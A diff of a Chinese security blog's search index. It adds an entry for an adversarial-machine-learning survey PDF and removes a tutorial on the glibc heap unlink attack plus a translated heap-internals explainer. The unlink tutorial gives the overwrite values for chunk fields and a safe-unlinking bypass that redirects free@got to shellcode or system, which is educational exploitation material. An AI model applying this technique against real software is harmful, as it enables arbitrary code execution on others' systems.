@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>深度学习的对抗攻击方法综述</title>
+    <url>/xiaohong404.github.io/2020/10/28/AI%E5%AE%89%E5%85%A8/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0/</url>
+    <content><![CDATA[ <div class="pdfobject-container" data-target="./PDF/深度学习的对抗攻击方法综述.pdf" data-height="500px"></div>]]></content>
+      <categories>
+        <category>AI安全</category>
+      </categories>
+      <tags>
+        <tag>AI</tag>
+        <tag>Machine Learning</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>forgot</title>
     <url>/xiaohong404.github.io/2020/10/27/AD_World/forgot/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/27/AD_World/forgot/0.png" class></strong></p>
@@ -43,216 +55,6 @@
       </tags>
   </entry>
   <entry>
-    <title>unlink漏洞攻击</title>
-    <url>/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/0.png" class></strong></p>
- <a id="more"></a>
-<h2 id="从一段代码开始"><a class="markdownIt-Anchor" href="#从一段代码开始"></a> 从一段代码开始</h2>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *first, *second;</span><br><span class="line">    first = <span class="built_in">malloc</span>(<span class="number">666</span>);</span><br><span class="line">    second = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(first, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(first);</span><br><span class="line">    <span class="built_in">free</span>(second);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>上述程序在分配完堆后，堆内存分布如下图所示：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/1.png" class></strong></p>
-<p>程序中 strcpy 函数会导致堆溢出，argv[1] 大于 666 字节时，可覆盖第二个 chunk 的各个字段为指定的值，从而使堆管理器将第二个 chunk 判断为空闲状态。根据 malloc 的内存回收机制，在 free(first) 时会将上图中的 second chunk 从 bin 中 unlink，并与第一个 chunk 合并。通过修改 second chunk 的 fd、bk 字段，unlink 时可把 free 函数的 GOT 表项写为 shellcode 地址。当程序再次调用 free 函数时会执行 shellcode。</p>
-<h2 id="什么是unlink"><a class="markdownIt-Anchor" href="#什么是unlink"></a> 什么是unlink</h2>
-<p>unlink攻击技术就是利用”glibc malloc”的内存回收机制，当堆块free时，会检查相邻的后面的堆块（地址更小的）或者前面的堆块（地址更大的）是否空闲，如果空闲，那么需要进行堆块合并操作。</p>
-<p>空闲的堆块一般以双向链表的形式组织（<strong>fast bin</strong>是单向链表，此攻击不适用），如果刚刚释放的堆块要与前面或者后面空闲的堆块进行合并操作，那么需要将前或后的堆块从双向链表中摘下来，合并成更大的堆块插入到<strong>unsort bin</strong>链表中。空闲堆块从（<strong>small bin</strong>)双向链表中摘下来的操作就是unlink。</p>
-<h3 id="向后合并"><a class="markdownIt-Anchor" href="#向后合并"></a> 向后合并</h3>
-<p>首先判断前一个 chunk 是否空闲，即检查当前 chunk 的 PREV_INUSE（P）位是否为 0。若为空闲，则将其合并。合并时，改变当前 chunk 指针指向前一个 chunk，使用 unlink 宏将前一个空闲 chunk 从 bin 中移除，最后更新合并后 chunk 的大小。</p>
-<p>malloc.c 中向后合并的代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">INTERNAL_SIZE_T prevsz; <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!(hd &amp; PREV_INUSE))</span><br><span class="line">&#123;</span><br><span class="line">  prevsz = p-&gt;prev_size;</span><br><span class="line">  p = chunk_at_offset(p, -(<span class="keyword">long</span>)prevsz);</span><br><span class="line">  sz += prevsz;</span><br><span class="line">  unlink(p, bck, fwd);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br></pre></td></tr></table></figure>
-<p>本例中，释放 1st chunk 时，当前 chunk(1st chunk) 的前一个 chunk 是 allocated，所以不能向后合并，unlink 宏不会被调用。</p>
-<h3 id="向前合并"><a class="markdownIt-Anchor" href="#向前合并"></a> 向前合并</h3>
-<p>首先判断下个 chunk 是否空闲，即检查下下个 chunk（相对当前 chunk）的 PREV_INUSE（P）位是否为 0，若为 0 表明下个 chunk 是空闲的，则进行合并。合并时使用 unlink 宏将下个 chunk 从它的 bin 中移除，并更新合并后的 chunk 大小。</p>
-<p>malloc.c 中向前合并的代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)\</span></span><br><span class="line"> (((mchunkptr)(((<span class="keyword">char</span>*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</span><br><span class="line">INTERNAL_SIZE_T hd = p-&gt;size; <span class="comment">/* its head field */</span></span><br><span class="line">INTERNAL_SIZE_T sz;  <span class="comment">/* its size */</span></span><br><span class="line">sz = hd &amp; ~PREV_INUSE;</span><br><span class="line">next = chunk_at_offset(p, sz);</span><br><span class="line">nextsz = chunksize(next);</span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!(inuse_bit_at_offset(next, nextsz)))   </span><br><span class="line">&#123;</span><br><span class="line">  sz += nextsz;</span><br><span class="line">  ...</span><br><span class="line">  unlink(next, bck, fwd);</span><br><span class="line">  next = chunk_at_offset(p, sz);</span><br><span class="line">&#125;</span><br><span class="line">set_head(p, sz | PREV_INUSE);</span><br><span class="line">next-&gt;prev_size = sz;</span><br></pre></td></tr></table></figure>
-<p>本例中，释放1st chunk 时，当前 chunk 的下一个 chunk（2nd chunk）是 allocated，所以不能向前合并，unlink 宏不会被调用。</p>
-<h3 id="unlink"><a class="markdownIt-Anchor" href="#unlink"></a> unlink</h3>
-<p>当前释放的堆与前一个或后一个空闲 chunk 进行合并时，会把空闲 chunk 从 bin 中移除，移除过程使用 unlink 宏来实现。unlink 宏的定义如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;  \</span></span><br><span class="line">  FD = P-&gt;fd;             \</span><br><span class="line">  BK = P-&gt;bk;             \</span><br><span class="line">  FD-&gt;bk = BK;            \</span><br><span class="line">  BK-&gt;fd = FD;            \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>unlink 即为将 P 从链表中删除的过程。</p>
-<h2 id="unlink攻击"><a class="markdownIt-Anchor" href="#unlink攻击"></a> unlink攻击</h2>
-<p>在 dlmalloc 中，unlink 的定义如上一节所示，只有与指针操作相关的 4 条语句。但在较新版本的 glibc 中，为了缓解攻击者进行 unlink 攻击，在宏定义中加入了安全校验，使得利用难度加大，只能在特定条件下使用一些技巧绕过校验。</p>
-<h3 id="原始的-unlink-攻击"><a class="markdownIt-Anchor" href="#原始的-unlink-攻击"></a> 原始的 unlink 攻击</h3>
-<p>述例子中，传入的字符串参数长度大于 666 字节时 strcpy 会使 first chunk 溢出，可覆盖 second chunk 的头部字段为如下值：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">prev_size = 偶数</span><br><span class="line">size = <span class="number">-4</span></span><br><span class="line">fd = <span class="built_in">free</span>@got - <span class="number">12</span></span><br><span class="line">bk = shellcode address</span><br></pre></td></tr></table></figure>
-<p>在执行 free(first) 时，当前释放的 frist chunk 的下下个 chunk 不是 top chunk。因为 second chunk 的大小覆盖为 -4，所以下下个 chunk 在 second chunk 偏移为 -4 的位置，因此 malloc 把 second chunk 的 prev_size 当做下下个 chunk 的 size。而 prev_size 已被覆盖为偶数（PREV_INUSE位为0），malloc 会将 second chunk 当作空闲 chunk。</p>
-<p>释放 first chunk 时会将 second chunk 从 bin 中 unlink，并将其合并到 first chunk。这个过程会触发 unlink（second），此时 <code>P = second chunk ptr</code>，unlink 过程如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = second chunk ptr-&gt;fd = <span class="built_in">free</span>@got – <span class="number">12</span></span><br><span class="line"><span class="number">2</span>）BK = second chunk ptr-&gt;bk = shellcode address</span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *((<span class="built_in">free</span>@got–<span class="number">12</span>)-&gt;bk) = shellcode address</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *(shellcode address-&gt;fd) = <span class="built_in">free</span>@got – <span class="number">12</span></span><br></pre></td></tr></table></figure>
-<p>unlink 步骤 1）和 2）将 second chunk 的 fd 和 bk 复制到 FD 和 BK。如下图所示，复制后 <code>FD = free@got-12</code>，<code>BK = shellcode address</code>，即 second chunk 的 fd、bk 指针分别指向 <code>free@got-12</code> 和 <code>shellcode address</code>。</p>
-<p>步骤 3）中 FD 是 malloc_chunk 结构体指针，FD-&gt;bk 相当于 <code>FD+12 = free@got-12+12 = free@got</code>，即 FD-&gt;bk 指向 free 的 GOT 表项，FD-&gt;bk = BK 相当于 <code>free@got = shellcode address</code>，即 free 的 GOT 表项被修改为了 shellcode 地址。因此，程序在执行第二个 free 时就会执行 shellcode。</p>
-<p>同理，步骤4）中将 <code>shellcode addr + 8</code> 处 4 个字节覆盖为 <code>free@got - 12</code>，所以在编写 shellcode 时应跳过这 4 个字节。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Heap/unlink%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/2.png" class></strong></p>
-<h2 id="对抗技术"><a class="markdownIt-Anchor" href="#对抗技术"></a> 对抗技术</h2>
-<h3 id="double-free检测"><a class="markdownIt-Anchor" href="#double-free检测"></a> Double Free检测</h3>
-<p>该机制不允许释放一个已经处于free状态的chunk。因此，当攻击者将second chunk的size设置为-4的时候，就意味着该size的PREV_INUSE位为0，也就是说second chunk之前的first chunk(我们需要free的chunk)已经处于free状态，那么这时候再free(first)的话，就会报出double free错误。相关代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used. */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
-<h3 id="next-size非法检测"><a class="markdownIt-Anchor" href="#next-size非法检测"></a> next size非法检测</h3>
-<p>该机制检测next size是否在8到当前arena的整个系统内存大小之间。因此当检测到next size为-4的时候，就会报出invalid next size错误。相关代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">             || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))&#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="双链表冲突检测"><a class="markdownIt-Anchor" href="#双链表冲突检测"></a> 双链表冲突检测</h3>
-<p>该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了。相关代码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!c</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br></pre></td></tr></table></figure>
-<p>但记住，即使由上述三种检测方式并不意味着unlink技术都会失效，攻防是一个此消彼长的过程，例如下面介绍一种绕过安全检验的方法（注意具体情况具体分析）。</p>
-<h2 id="绕过安全校验"><a class="markdownIt-Anchor" href="#绕过安全校验"></a> 绕过安全校验</h2>
-<p>首先，需要了解 glibc 中 unlink 的校验机制。以下为 glibc-2.19 中 unlink 宏的部分代码，在删除 P 节点之前会检查 <code>FD-&gt;bk != P || BK-&gt;fd != P</code> 是否成立，即检查当前 chunk 前一个 chunk 的 bk 与后一个 chunk 的 fd 是否指向当前 chunk。若当前 chunk 的 fd 和 bk 被修改则无法通过这项检查，<code>FD-&gt;bk = BK</code> 与 <code>BK-&gt;fd = FD</code> 不会执行，导致 unlink 攻击不能进行。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;         \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);      \</span><br><span class="line">    <span class="keyword">else</span> &#123;								          \</span><br><span class="line">        FD-&gt;bk = BK;						    \</span><br><span class="line">        BK-&gt;fd = FD;						    \</span><br><span class="line">        ...</span><br><span class="line">    &#125;									              \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>为了绕过以上指针校验，需要以下条件：</p>
-<blockquote>
-<p>a） 程序中存在一个全局指针变量 ptr<br>
-b） ptr 指向的堆内存可由用户控制</p>
-</blockquote>
-<p>若具备以上条件，攻击者可在指针 ptr 指向的内存中伪造一个空闲 chunk P，根据 ptr 构造合适的地址覆盖 chunk P 的 fd 和 bk，使得 <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code> 成立。具体如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = ptr - <span class="number">0xC</span></span><br><span class="line">P-&gt;bk = ptr - <span class="number">0x8</span></span><br></pre></td></tr></table></figure>
-<p>在执行 unlink（P）时的指针操作如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>）FD = P-&gt;fd = ptr - <span class="number">0xC</span>;</span><br><span class="line"><span class="number">2</span>）BK = P-&gt;bk = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="comment">// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr</span></span><br><span class="line"><span class="comment">// 由于 ptr 指向 P,可成功绕过指针校验</span></span><br><span class="line"><span class="number">3</span>）FD-&gt;bk = BK，即 *ptr = ptr - <span class="number">0x8</span>;</span><br><span class="line"><span class="number">4</span>）BK-&gt;fd = FD，即 *ptr = ptr - <span class="number">0xC</span>。</span><br></pre></td></tr></table></figure>
-<p>由以上过程可知，借助指向 chunk P 的 ptr 指针可绕过 “corrupted double-linked list” 安全机制，并通过 unlink 攻击实现写内存，最终使得 ptr 指向 ptr - 0xc。</p>
-<p>unlink 后，对 ptr 指向的内存进行写入，如 <code>‘A’*0xC + free@got</code>，使得 ptr 指向 free@got，再次对 ptr 指向的内存进行写入，可以把 free@got 修改为 system 的地址，之后调用 free 可任意命令执行。</p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Heap</category>
-        <category>Heap_Attack</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Heap I</title>
-    <url>/xiaohong404.github.io/2020/10/16/Heap/Heap-I/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/0.png" class></strong></p>
- <a id="more"></a>
-<p><a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/">原版传送门</a></p>
-<h3 id="what-is-the-heap-and-why-do-people-use-it"><a class="markdownIt-Anchor" href="#what-is-the-heap-and-why-do-people-use-it"></a> <strong>WHAT IS THE HEAP, AND WHY DO PEOPLE USE IT?</strong></h3>
-<p>堆是C/C++程序员在程序执行期间手动分配的新的区域。程序员通过调用堆相关的函数如<em>malloc</em>向堆管理器请求这部分区域。这些被分配的内存区域，或者称为“allocations”，之后可以被程序员一直使用、修改或者引用，直到他们不再需要这部分区域，会调用free函数将这部分区域返还给堆管理器。</p>
-<p>下面是一个C语言程序分配、使用并且释放堆上的结构体的例子：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> field1;</span><br><span class="line">    <span class="keyword">char</span>* field2;</span><br><span class="line">&#125; SomeStruct;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SomeStruct* myObject = (SomeStruct*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SomeStruct));</span><br><span class="line">    <span class="keyword">if</span>(myObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        myObject-&gt;field1 = <span class="number">1234</span>;</span><br><span class="line">        myObject-&gt;field2 = “Hello World!”;</span><br><span class="line">        do_stuff(myObject);</span><br><span class="line">	<span class="built_in">free</span>(myObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>所以只要程序员遵循下面几个小的规则，堆管理器将确保每个已分配的堆不会相互重叠。这个特点使得堆非常有用并且高效，这和大多数C/C++程序追求性能的要求相符合。</p>
-<p>接下来的图表列出了一些程序员在使用堆时的基本规则，以及在程序员违反这些规则时发生的一些漏洞类别。之后，我将更详细地讨论所有这些与堆相关的漏洞类别，目前只讨论堆使用正确时的表现。</p>
-<h3 id="heap-rules"><a class="markdownIt-Anchor" href="#heap-rules"></a> HEAP RULES</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/1.png" class></strong></p>
-<p>当然，<em>malloc</em>和<em>free</em>并不是C和C<ins>程序员与堆进行交互的唯一方式。相反，C</ins>开发人员通常通过C<ins>运算符new和new []分配内存。必须使用相应的C</ins>运算符delete和delete []而不是<em>free</em>释放这些分配。程序员还可以通过与malloc兼容的堆函数（例如<a href="http://man7.org/linux/man-pages/man3/calloc.3p.html"><em>calloc</em></a>，<a href="http://man7.org/linux/man-pages/man3/realloc.3p.html"><em>realloc</em></a>和<a href="https://linux.die.net/man/3/memalign"><em>memalign）</em></a>来分配内存，这些函数最终也通过<em>free</em>释放，就像<em>malloc</em>一样。</p>
-<p>为简单起见，将首先讨论<em>malloc</em>和<em>free</em>，下面是一个C++程序如何分配，使用和释放堆上的结构体的例子：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SomeClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> field1;</span><br><span class="line">    <span class="keyword">char</span>* field2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SomeClass* myObject = <span class="keyword">new</span> SomeClass();</span><br><span class="line">    myObject-&gt;field1 = <span class="number">1234</span>;</span><br><span class="line">    myObject-&gt;field2 = “Hello World!”;</span><br><span class="line">    do_stuff(myObject);</span><br><span class="line">    <span class="keyword">delete</span> myObject;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="memory-chunks-and-the-chunk-allocation-strategies"><a class="markdownIt-Anchor" href="#memory-chunks-and-the-chunk-allocation-strategies"></a> <strong>MEMORY CHUNKS AND THE CHUNK ALLOCATION STRATEGIES</strong></h3>
-<p>假设一个程序员通过malloc需求10字节内存，为了满足这个请求，堆管理器不仅仅只随机寻找一个10字节的程序员可以写的区域，而是需要做更多的事情。堆管理器也需要存储此次分配的元数据。这个元数据被存储在紧邻分配的10字节区域处。</p>
-<p>堆管理器还需要确保分配空间在32位系统上是8字节对齐的，在64位系统上是16字节对齐的。如果程序员只想存储文本字符串或字节数组之类的数据，那么分配空间的对齐方式无关紧要。但是如果程序员打算使用分配空间来存储更多复杂的数据结构，则对齐方式会对程序的正确性和性能会产生重大影响。由于<em>malloc</em>无法知道程序员将在分配空间中存储什么内容，因此堆管理器必须默认确保所有分配空间均对齐。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/2.png" class></strong></p>
-<p>此分配元数据和对齐填充字节与<em>malloc</em>的内存区域将一起被存储并返回给程序员。因此，堆管理器在内部分配的“块”内存比程序员最初要求的稍大。当程序员要求10个字节的内存时，堆管理器会找到或创建一个新的内存块，该块足以存储10个字节的空间、元数据以及对齐填充字节。然后，堆管理器将此块标记为“已分配”，并返回指向块内对齐的10字节“用户数据”区域的指针，程序员将收到<em>malloc</em>调用的返回值。</p>
-<h3 id="chunk-allocation-basic-strategy"><a class="markdownIt-Anchor" href="#chunk-allocation-basic-strategy"></a> <strong>CHUNK ALLOCATION: BASIC STRATEGY</strong></h3>
-<p>那么堆管理器如何在内部分配这些块呢？</p>
-<p>首先，让我们看一下堆管理器的大部分工作，分配小块内存的（大大简化的）策略。我将在详细地解释每个步骤，之后我们就可以研究分配大块内存的特殊情况。</p>
-<p>简化的小块分配策略如下：</p>
-<ol>
-<li>
-<p>如果有一个先前释放的内存块，并且该块足够大，可以满足用户的请求，则堆管理器将使用这个释放的块进行新的分配。</p>
-</li>
-<li>
-<p>否则，如果堆顶部有可用空间，则堆管理器将从这个空闲的空间中分配一个新的块并使用它。</p>
-</li>
-<li>
-<p>否则，堆管理器将要求内核向堆的末尾添加新的内存，并且从新分配的空间中分配一个新块给用户。</p>
-</li>
-<li>
-<p>如果前面所有策略均失败，则无法为提供分配服务，并且<em>malloc</em>返回NULL。</p>
-</li>
-</ol>
-<h4 id="allocating-from-freed-chunks"><a class="markdownIt-Anchor" href="#allocating-from-freed-chunks"></a> <strong>ALLOCATING FROM FREE’D CHUNKS</strong></h4>
-<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/3.png" class></strong></p>
-<p>从概念上讲，分配之前释放的块非常简单。因为当一个块在内存中被释放，堆管理器会在一系列称为*“bins”<em>的不同链表中记录这些释放的块。用户发出一个分配请求后，堆管理器会在这些</em>“bins”<em>中搜索一个足够大的空闲块，为用户提供服务。如果可以成功找到一个，则将这个空闲块从特定的bin中删除，并标记为“已分配”，然后这个指向该“user data”区域块的指针，会作为</em>malloc*的返回值返回给程序员。</p>
-<p>出于性能原因，有几种不同类型的<em>bins</em>，即<em>fast bins 、unsorted bins 、small bins、large bins 、per-thread tcache</em>。下个部分将详细讨论这些不同种类的<em>bins</em>。</p>
-<h4 id="allocating-from-the-top-of-the-heap"><a class="markdownIt-Anchor" href="#allocating-from-the-top-of-the-heap"></a> <strong>ALLOCATING FROM THE TOP OF THE HEAP</strong></h4>
-<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/4.gif" class></strong></p>
-<p>如果没有可用的空闲块可以满足分配请求，则堆管理器必须从头开始构造一个新块。为此，堆管理器首先查看堆顶部是否有足够的可用空间（有时称为“top chunk”或“remainder chunk”）。如果存在，堆管理器将在此可用空间基础上构造一个新块。</p>
-<h4 id="asking-the-kernel-for-more-memory-at-the-top-of-the-heap"><a class="markdownIt-Anchor" href="#asking-the-kernel-for-more-memory-at-the-top-of-the-heap"></a> <strong>ASKING THE KERNEL FOR MORE MEMORY AT THE TOP OF THE HEAP</strong></h4>
-<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/5.gif" class></strong></p>
-<p>一旦堆顶部的可用空间用完，堆管理器将不得不要求内核在堆的末尾增加更多内存。</p>
-<p>在建立堆的开始阶段上，堆管理器通过调用<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html"><em>sbrk</em></a>，要求内核在堆末尾分配更多的内存。在大多数基于Linux的系统上，在内部使用称为“ <a href="https://linux.die.net/man/2/brk">brk</a> ”的系统调用。这个系统调用的名称很容易混淆，它最初的意思是“更改程序中断位置”，通俗来说，它表示在程序加载到内存之后，该区域会增加更多的内存。因为这是堆管理器从一开始创建堆的地方，所以此系统调用的作用是在程序堆的末尾分配更多的内存。</p>
-<p>最终，如果一直使用<em>sbrk</em>扩展堆会导致分配失败，因为堆空间增长得太大之后，进一步扩展将导致其与进程地址空间中的其他内容发生冲突，例如内存映射，共享库或线程的堆栈区域。因此sbrk无法分配时，堆管理器将使用<a href="http://man7.org/linux/man-pages/man2/mmap.2.html"><em>mmap</em></a>调用将新的非连续内存<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l2320">附加</a>到初始程序堆。</p>
-<p>如果<em>mmap</em>也失败，则该进程根本无法分配更多的内存，并且<em>malloc</em>将返回NULL。</p>
-<h3 id="off-heap-allocations-via-mmap"><a class="markdownIt-Anchor" href="#off-heap-allocations-via-mmap"></a> <strong>OFF-HEAP ALLOCATIONS VIA MMAP</strong></h3>
-<p>很大的分配请求（超过某个阈值*）在堆管理器中会得到<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l866">特殊处理</a>。通过直接调用<em>mmap</em>可以在堆外分配这些大块，并使用块中元数据的标记位来标记这一事实。当这些巨大块通过调用<em>free</em>释放到堆管理器时，堆管理器将通过<em>munmap</em>将整个<em>mmap</em> 过的区域返还给系统。</p>
-<p>*默认情况下，此<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l858">阈值</a> 在32位系统上为128KB~512KB，在64位系统上为32MB，但是，如果堆管理器检测到这些分配的大块内存只需要被临时使用，则此阈值也会<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l949">动态增加</a>。</p>
-<h3 id="arenas"><a class="markdownIt-Anchor" href="#arenas"></a> <strong>ARENAS</strong></h3>
-<p>在多线程应用程序上，堆管理器需要保护内部堆数据结构免受可能导致程序崩溃的竞争条件的影响。在<em>ptmalloc2</em>之前，堆管理器通过在每次堆操作之前简单地使用全局互斥锁，以确保在任何给定时间只有一个线程可以与堆进行交互。</p>
-<p>尽管此策略有效，但堆分配器对高利用率和性能非常敏感，以至于导致使用大量线程的应用程序出现严重的性能问题。为了解决这个问题，<em>ptmalloc2</em>堆分配器引入了*“arenas”<em>的概念。每个</em>“arenas”<em>本质上是一个完全不同的堆，它完全独立地管理自己的块分配和</em>free bins*。每个*“arenas”<em>仍然使用互斥锁来序列化不同线程对内部数据结构的访问，但是只要线程与不同的</em>“arenas”*进行交互，线程就可以安全地执行堆操作而不会彼此停顿。</p>
-<p>程序的初始（“main”）<em>“arenas”<em>仅包含我们已经看到的堆，对于单线程应用程序，这是堆管理器将使用的唯一</em>arena</em>。但是，随着新线程加入该进程，堆管理器会为每个新线程分配并附加*“arenas”<em>，以减少</em>malloc<em>和</em>free*等操作的等待时间。</p>
